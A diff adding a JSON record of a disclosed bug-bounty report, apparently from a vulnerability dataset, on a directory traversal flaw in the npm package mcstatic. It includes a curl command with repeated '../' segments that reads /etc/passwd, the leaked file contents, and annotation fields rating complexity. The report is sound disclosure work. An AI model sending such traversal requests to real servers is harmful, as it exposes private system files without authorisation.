@@ -1,0 +1,42 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "tungpun ",
+    "title": "[mcstatic] Server Directory Traversal",
+    "content": "\nI would like to report a Server Directory Traversal in mcstatic.\nIt allows reading local files on the target server.\nModule\nmodule name: mcstatic\nversion: 0.0.20\nnpm page: https://www.npmjs.com/package/mcstatic\nModule Description\nStatic Http server for mocking and stuff\nVulnerability\nSteps To Reproduce:\nInstall the module\n$ npm i mcstatic\nStart the server\n$ ./node_modules/mcstatic/bin/mcstatic --port 6060\nUsing the below request to access the file /etc/passwd on the target server:\nCode 473 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'\n2##\n3# User Database\n4#\n5# Note that this file is consulted directly only when the system is running\n6# in single-user mode.  At other times this information is provided by\n7# Open Directory.\n8#\n9# See the opendirectoryd(8) man page for additional information about\n10# Open Directory.\n11##\n12nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\n13root:*:0:0:System Administrator:/var/root:/bin/sh\n14...\nSupporting Material/References:\nnode v8.10.0\nnpm 5.6.0\ncurl 7.54.0\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nreading local files on the target server\n\n",
+    "severity": [
+        8.6,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1528805760,
+    "report_url": "https://hackerone.com/reports/330285",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Install the module: npm i mcstatic"
+        ],
+        [
+            2,
+            "Start the server: ./node_modules/mcstatic/bin/mcstatic --port 6060"
+        ],
+        [
+            3,
+            "Access the file /etc/passwd on the target server using curl: curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a Server Directory Traversal in mcstatic, which allows reading local files on the target server. By manipulating the URL path, an attacker can access sensitive files like /etc/passwd.",
+    "reason": "The attack is straightforward and does not involve multiple components, complex interactions, or novel logic. It is a classic directory traversal attack that exploits insufficient path validation.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
